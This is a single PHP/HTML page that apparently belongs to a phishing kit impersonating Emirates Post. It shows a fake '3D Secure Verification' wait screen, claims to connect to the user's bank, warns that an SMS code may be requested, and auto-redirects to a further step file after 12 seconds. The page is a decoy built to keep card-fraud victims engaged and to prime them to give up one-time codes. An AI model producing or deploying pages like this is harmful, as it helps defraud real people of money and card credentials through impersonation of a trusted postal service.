<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="12;url=index4.php">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure Verification</title>
    <link rel="icon" href="./assets/favicon.ico">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./assets/style/welcom.css">
</head>
<body class="bg-slate-50">
    <div class="min-h-screen flex flex-col items-center justify-center px-4 text-center">
        <div class="max-w-xl bg-white shadow-xl rounded-3xl p-10 space-y-6">
            <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                <i class="fas fa-shield-alt text-blue-600 text-3xl"></i>
            </div>
            <h1 class="text-3xl font-bold text-gray-800">3D Secure Verification</h1>
            <p class="text-gray-600">
                We are redirecting you to your bank&apos;s secure verification step. This helps us confirm your identity and protect your card.
            </p>
            <div class="flex items-center justify-center space-x-3 text-blue-600">
                <i class="fas fa-circle-notch fa-spin text-2xl"></i>
                <span class="font-semibold">Connecting to Emirates Post gateway?</span>
            </div>
            <div class="bg-blue-50 border border-blue-200 rounded-xl p-5 text-left text-sm text-blue-800">
                <p class="font-semibold mb-2">What happens next?</p>
                <ul class="list-disc list-inside space-y-1">
                    <li>We securely send your request to your bank.</li>
                    <li>You may be asked to confirm with an SMS code.</li>
                    <li>Do not close this window while verification is in progress.</li>
                </ul>
            </div>
            <p class="text-xs text-gray-500">Need help? Contact Emirates Post support at any time.</p>
        </div>
    </div>
</body>
</html>
